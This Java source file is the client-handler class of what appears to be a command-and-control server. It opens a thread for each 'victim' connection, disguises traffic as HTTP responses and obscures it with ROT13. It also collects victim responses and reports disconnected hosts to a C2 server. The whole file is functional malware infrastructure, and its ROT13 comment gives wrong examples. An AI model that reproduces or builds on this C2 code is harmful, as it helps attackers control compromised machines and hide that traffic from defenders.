package Servers.Beacon;

import Servers.Duplexer;
import java.io.IOException;

public class BeaconClientHandler implements Runnable{
    private String IPAddress;
    private Duplexer duplexer;
    private BeaconServer beaconServer;
    private String os;
    private Boolean sentinel = true;

    /**
     * Use this Class to create a new thread to handle each victim connection
     * 
     * @param IPAddress IP address of the client (victim)
     * @param duplexer Pointer to the duplexer so that this thread can receive messages from the victim.
     */
    protected BeaconClientHandler(String IPAddress, Duplexer duplexer, BeaconServer beaconServer, String os){
        this.IPAddress = IPAddress;
        this.duplexer = duplexer;
        this.beaconServer = beaconServer;
        this.os = os;
    }

    protected void quit(String reason) throws IOException{
        duplexer.close();
    }


    /**
     * Encrypts/Decrypts the plain text with a simple rot13 cipher - Shifts each letter by 13 spots.
     * (ex. A --> B, E --> R, Y --> L)
     * 
     * Because each letter is just shifted by 13 characters, encrypting/decrypting are the same algorithm
     * 
     * @param plaintext - The text to be shifted
     * @return - The new encrypted/decrypted text
     */
    private String encrypt(String plaintext) {
        StringBuilder encryptedText = new StringBuilder();

        for (char character : plaintext.toCharArray()) {
            if (character >= 'a' && character <= 'z') {
                encryptedText.append((char) ('a' + (character - 'a' + 13) % 26));
            } else if (character >= 'A' && character <= 'Z') {
                encryptedText.append((char) ('A' + (character - 'A' + 13) % 26));
            } else {
                encryptedText.append(character);
            }
        }
        return encryptedText.toString();
    }

    /**
     * Use this function to have the thread send a message to the client
     * 
     * @param message Message to be sent
     */
    protected void sendToClient(String message){
        if(sentinel){
            message = encrypt(message);
            String httpHeader = "HTTP/1.1 200 OK\r\n" +  "Content-Length: " + message.length() + "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
            message = httpHeader + message;
            duplexer.send(message);
        }
    }

    @Override
    public void run(){
        while(sentinel){
            try{
                String response = duplexer.receive();
                if(!(response.equals("GET / HTTP/1.1")) && !(response.contains("Content-Length")) && !(response.equals("Content-Type: text/plain; charset=utf-8")) && !(response.isBlank())){
                    response = encrypt(response);
                    beaconServer.addDataToResponsesDictionaries(IPAddress, response);
                }
            } catch (IOException e){
                sentinel = false;
                try{
                    duplexer.close();
                } catch (IOException d){
                    d.printStackTrace();
                }
                beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
                beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
                e.printStackTrace();
            } catch (java.lang.NullPointerException e){
                sentinel = false;
                try{
                    duplexer.close();
                } catch (IOException d){
                    d.printStackTrace();
                }
                beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
                beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
                e.printStackTrace();
            }
            
        }
    }
}
